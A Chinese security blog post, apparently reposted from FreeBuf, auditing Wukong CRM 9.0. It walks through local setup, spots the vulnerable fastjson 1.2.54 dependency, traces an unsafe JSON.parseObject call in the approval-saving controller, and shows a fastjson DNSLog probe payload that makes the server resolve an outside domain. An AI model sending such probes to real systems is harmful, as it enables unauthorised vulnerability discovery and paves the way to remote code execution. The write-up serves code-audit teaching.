#  JAVA代码审计-悟空crm客户管理系统fastjson漏洞   
 船山信安   2024-11-25 16:07  
  
## 一. 本地搭建  
  
版本：Wukong CRM9.0  
  
1. 搭建需要使用myql数据库和redis两个，使用phpstudy搭建即可，mysql数据库的文件为WukongCRM-9.0-JAVA-9.0.1_20191202/src/main/resources/config/crm9-config.txt，将下载的crm9.sql导入数据库即可，数据库格式为UTF-8；redis配置文件为同目录下的redis.json文件，redis默认密码为123456。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicNgqyV0ic09xj6KicD7Y1fn9OXWbUsdp8nKicoFJWUiaiayjiaP37JuhTDd01WpBe6TvSjHaXsV2ZsDbF9w/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicNgqyV0ic09xj6KicD7Y1fn9O8AbyLJsMCI9iaoYBLfZV8UcVgY5bkfqzqibiaGw3cSvoX7PNJMzn24g8w/640?wx_fmt=jpeg&from=appmsg "")  
  
2. 配置好后使用idea打开，配置Tomcat中间件进行本地运行，没有报错正常起来界面如下，默认账号为：admin/123456  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicNgqyV0ic09xj6KicD7Y1fn9OEEpULeWia1Aj1jdFx8DRBVBuGK8S7EYzqEJD8VudQpVCbGYgOBKehbA/640?wx_fmt=jpeg&from=appmsg "")  
## 二. fastjson漏洞审计  
  
1. 查看pom.xml文件，发现引用了fastjson组件，版本为有漏洞的1.2.54。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicNgqyV0ic09xj6KicD7Y1fn9O5YeuclpKTXj1lqmIicDd61iafgxu2MibuDa5Ceayf3D97YhqjtVtyP2UQ/640?wx_fmt=jpeg&from=appmsg "")  
  
2. 确定后，查找哪里引用了组件，并且是可控的。  
```
```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicNgqyV0ic09xj6KicD7Y1fn9OrUJvkhsKUywhybClQNhIwXm8h8KWoFr9tAjZnoPicycMe9jzchIN8Mw/640?wx_fmt=jpeg&from=appmsg "")  
  
3. 发现好多地方引用，这个方法如果没有其他处理的话，是会引起反序列话的，进入一个查看具体的代码。  
> 在AdminExamineController.java中的添加审批处：  
> 代码解释@Permissions("manage:examineFlow:update")这是一个注解，用于权限控制。表示调用此方法需要具有 manage:examineFlow:update 权限。public void saveExamine()定义了一个公共方法 saveExamine，该方法没有返回值（void）。JSONObject jsonObject = JSON.parseObject(getRawData());从请求中获取原始数据（getRawData() 方法返回一个字符串），并将其解析为一个 JSONObject 对象。JSON.parseObject 是一个将 JSON 字符串转换为 JSONObject 的方法。renderJson(examineService.saveExamine(jsonObject));调用 examineService 对象的 saveExamine 方法，并将解析后的 jsonObject 作为参数传递。examineService.saveExamine(jsonObject) 的返回值将被传递给 renderJson 方法，用于生成 HTTP 响应的 JSON 格式数据。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicNgqyV0ic09xj6KicD7Y1fn9O9FLsPpicI9WZZKRIeMotYM32rK8ic8GLBn58pJiaiaKJMQF381vAoibZOVw/640?wx_fmt=jpeg&from=appmsg "")  
  
4. 根据提示找到添加审批处，抓包尝试dnslog。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicNgqyV0ic09xj6KicD7Y1fn9OWMzQQTFTrvdBCFqNkbwCicl8viaC16xcklIcsAORJ6cPay92yfRib1BiaQ/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicNgqyV0ic09xj6KicD7Y1fn9O44iaxXeUykQhxR8whImaG9zN84yl41cQiazfaRsye77VfD5SopFUTROg/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicNgqyV0ic09xj6KicD7Y1fn9Oiam3gWhQy3wHLI5gKkqLhCnOCETpOzXFrQjmv1qBybLhiciao3ib8KHaow/640?wx_fmt=jpeg&from=appmsg "")  
  
5. 打开dnslog平台，使用fastjson漏洞poc探测，可以看到成功回显。  
> {"zeo":{"@type":"java.net.Inet4Address","val":"0r8b41.dnslog.cn"}![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicNgqyV0ic09xj6KicD7Y1fn9ORYBBTFptlRUhnRQ0uwXrcLrJgqBmiayFkycOm5Yx05ibfGSgPmJR5R2A/640?wx_fmt=jpeg&from=appmsg "")  
  
>   
> 结尾：这只是其中的一处，根据代码搜索看在产品处，线索处等都存在漏洞。  
> ![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicNgqyV0ic09xj6KicD7Y1fn9O6XcEpFzFI1kVT8rT93y5v7OE5ZGy94LXyLIvDDiasLzMgo4JZSWpkLw/640?wx_fmt=jpeg&from=appmsg "")  
  
> ![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicNgqyV0ic09xj6KicD7Y1fn9OwhDqyJLDEiccdsz49ue7JiaRdAXrYF88KyEDFHJibbbxZX9NXZcxRS36A/640?wx_fmt=jpeg&from=appmsg "")  
  
  
  
来源：【  
JAVA代码审计-悟空crm客户管理系统fastjson漏洞 - FreeBuf网络安全行业门户  
】  
  
